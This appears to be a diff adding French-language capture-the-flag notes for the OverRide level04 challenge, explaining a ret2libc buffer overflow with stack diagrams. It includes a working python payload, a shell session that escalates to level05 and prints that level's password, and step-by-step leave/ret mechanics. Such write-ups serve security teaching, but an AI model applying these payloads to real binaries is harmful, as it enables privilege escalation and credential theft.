@@ -574,11 +574,223 @@ python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97
 
 
 
+address exit not important now
+
+[padding] + [address system] + [   4 bytes  ] + [arg system]
+└───┬───┘ + └───────┬──────┘ + └──────┬─────┘ + └─────┬────┘
+   160	  +			4		 +		  4		  +		  4			  		
 
 
+python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'
 
 
+level04@OverRide:~$ (python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04 
+Give me some shellcode, k
+id
+uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+^C
+
+_______________________________________________
 
 
+Recrit mon explication est schemas, garde la structure de schema de stack et le etape pas a pas:
+Donc normalement :
+... (d'autre args si il y en a)
+EBP + 12   arg 2 
+EBP + 8   arg 1
+EBP + 4   saved EIP (ou ret address)
+EBP    saved EBP
+EBP - 4    debut des var locals
+<-ESP point end var locals
 
+Et dans ret2libc, on envoit 
+[padding] [address system] [ret address of system] [address of "/bin/sh"]
+
+dans la stack :
+
+EBP + 12   arg 2  -  [address of "/bin/sh"]
+EBP + 8   arg 1  -  [ret address of system]
+EBP + 4   saved EIP (ou ret address)  -  [address system]
+EBP    saved EBP  -  [padding]
+EBP - 4    debut des var locals  - [padding]
+<-ESP point end var locals
+
+
+Lorsque leave de la fonction vulnerable est appele, ESP remonte :
+
+EBP + 12   arg 2  -  [address of "/bin/sh"]
+EBP + 8   arg 1  -  [ret address of system]
+EBP + 4   saved EIP (ou ret address)  -  [address system]
+EBP    saved EBP  -  [padding] <-ESP 
+EBP - 4    debut des var locals  - [padding]
+
+ et le top element de la stack est pop (ou point ESP) dans EBP :
+
+EBP_old + 12   arg 2  -  [address of "/bin/sh"]
+EBP_old + 8   arg 1  -  [ret address of system]
+EBP_old + 4   saved EIP (ou ret address)  -  [address system] <-ESP 
+~EBP_old    saved EBP  -  [padding] ~ pop dans EBP 
+EBP_old - 4    debut des var locals  - [padding]
+
+Lorsque ret de la fonction vunerable est appele, saved EIP est pop dans EIP, ce qui redirige le processe a system() :
+
+EBP_old + 12   arg 2  -  [address of "/bin/sh"]
+EBP_old + 8   arg 1  -  [ret address of system] <-ESP 
+~EBP_old + 4   saved EIP (ou ret address)  -  [address system]~ pop dans EIP 
+~EBP_old    saved EBP  -  [padding] ~ pop dans EBP 
+EBP_old - 4    debut des var locals  - [padding]
+
+Apres le setup de stack de system 'push ebp et move ebp, esp' :
+
+EBP + 8  arg 1  -  [address of "/bin/sh"]
+EBP + 4  saved EIP (ou ret address)   -  [ret address of system] 
+EBP (just pushed) <-ESP 
+EBP - ... var locals
+(ESP probalement decale pour avoir de la place pour les var locals)
+
+Pendant son utilisation, utilise arg 1 - EBP + 8 - [address of "/bin/sh"]
+
+Et lorsque system atteint leave et ret, EIP deviendra saved EIP - EBP + 4 - [ret address of system]
+
+### Structure normale de la pile dans une fonction
+
+```
+Adresse haute
+┌─────────────────────────────────────────┐
+│  ...           │  autres args           │
+├─────────────────────────────────────────┤
+│  EBP + 12      │  arg 2                 │
+├─────────────────────────────────────────┤
+│  EBP + 8       │  arg 1                 │
+├─────────────────────────────────────────┤
+│  EBP + 4       │  saved EIP             │
+├─────────────────────────────────────────┤
+│  EBP           │  saved EBP             │
+├─────────────────────────────────────────┤
+│  EBP - 4       │  début vars locales    │
+├─────────────────────────────────────────┤
+│  ...           │  ...                   │  ← ESP
+└─────────────────────────────────────────┘
+Adresse basse
+```
+
+---
+
+### Payload envoyé
+
+```
+[ padding ] [ adresse de system() ] [ ret address de system ] [ adresse de "/bin/sh" ]
+```
+
+---
+
+### Étape 1 — Après l'overflow, avant `leave`
+
+Le buffer et le saved EBP sont écrasés par le padding, le saved EIP par l'adresse de `system()`, et les cases au-dessus par les éléments suivants du payload.
+
+```
+┌─────────────────────────────────────────┐
+│  EBP + 12      │  adresse de "/bin/sh"  │
+├─────────────────────────────────────────┤
+│  EBP + 8       │  ret address system    │
+├─────────────────────────────────────────┤
+│  EBP + 4       │  adresse de system()   │  ← saved EIP écrasé
+├─────────────────────────────────────────┤
+│  EBP           │  padding               │  ← saved EBP écrasé
+├─────────────────────────────────────────┤
+│  EBP - 4       │  padding               │
+├─────────────────────────────────────────┤
+│  ...           │  padding               │  ← ESP
+└─────────────────────────────────────────┘
+```
+
+---
+
+### Étape 2 — `leave` (partie 1) : `mov esp, ebp`
+
+ESP remonte au niveau d'EBP.
+
+```
+┌─────────────────────────────────────────┐
+│  EBP + 12      │  adresse de "/bin/sh"  │
+├─────────────────────────────────────────┤
+│  EBP + 8       │  ret address system    │
+├─────────────────────────────────────────┤
+│  EBP + 4       │  adresse de system()   │
+├─────────────────────────────────────────┤
+│  EBP           │  padding               │  ← ESP
+├─────────────────────────────────────────┤
+│  EBP - 4       │  padding               │
+├─────────────────────────────────────────┤
+│  ...           │  padding               │
+└─────────────────────────────────────────┘
+```
+
+---
+
+### Étape 3 — `leave` (partie 2) : `pop ebp`
+
+Le padding est poppé dans EBP (EBP est maintenant corrompu, peu importe). ESP avance de 4.
+
+```
+┌─────────────────────────────────────────┐
+│  EBP_old + 12  │  adresse de "/bin/sh"  │
+├─────────────────────────────────────────┤
+│  EBP_old + 8   │  ret address system    │
+├─────────────────────────────────────────┤
+│  EBP_old + 4   │  adresse de system()   │  ← ESP
+├─────────────────────────────────────────┤
+│ ~~EBP_old~~    │  ~~padding~~           │  → poppé dans EBP
+├─────────────────────────────────────────┤
+│  EBP_old - 4   │  padding               │
+└─────────────────────────────────────────┘
+```
+
+---
+
+### Étape 4 — `ret` : `pop eip`
+
+L'adresse de `system()` est poppée dans EIP. Le CPU saute vers `system()`. ESP avance de 4.
+
+```
+┌─────────────────────────────────────────┐
+│  EBP_old + 12  │  adresse de "/bin/sh"  │
+├─────────────────────────────────────────┤
+│  EBP_old + 8   │  ret address system    │  ← ESP  (c'est ESP+0 du point de vue de system())
+├─────────────────────────────────────────┤
+│ ~~EBP_old + 4~~│  ~~adresse system()~~  │  → poppé dans EIP, CPU saute vers system()
+├─────────────────────────────────────────┤
+│ ~~EBP_old~~    │  ~~padding~~           │  → poppé dans EBP (étape précédente)
+├─────────────────────────────────────────┤
+│  EBP_old - 4   │  padding               │
+└─────────────────────────────────────────┘
+```
+
+À ce moment, du point de vue de `system()`, la pile ressemble exactement à ce qu'un `CALL system` aurait produit : une return address en ESP+0 et un argument en ESP+4.
+
+---
+
+### Étape 5 — Prologue de `system()` : `push ebp` / `mov ebp, esp`
+
+```
+┌─────────────────────────────────────────┐
+│  EBP + 8       │  adresse de "/bin/sh"  │  ← arg 1
+├─────────────────────────────────────────┤
+│  EBP + 4       │  ret address system    │  ← saved EIP de system()
+├─────────────────────────────────────────┤
+│  EBP           │  saved EBP (pushé)     │  ← ESP / EBP
+├─────────────────────────────────────────┤
+│  EBP - ...     │  vars locales system() │  ← ESP (après sub esp, N)
+└─────────────────────────────────────────┘
+```
+
+`system()` accède à son **arg 1** via `EBP + 8` → trouve `adresse de "/bin/sh"` → exécute le shell.
+
+---
+
+### Étape 6 — `leave` / `ret` de `system()`
+
+`system()` termine, son `leave` + `ret` popent son saved EIP → `ret address system` → le processus saute proprement vers `exit()` (ou plante si tu as mis `0xdeadbeef`).
 
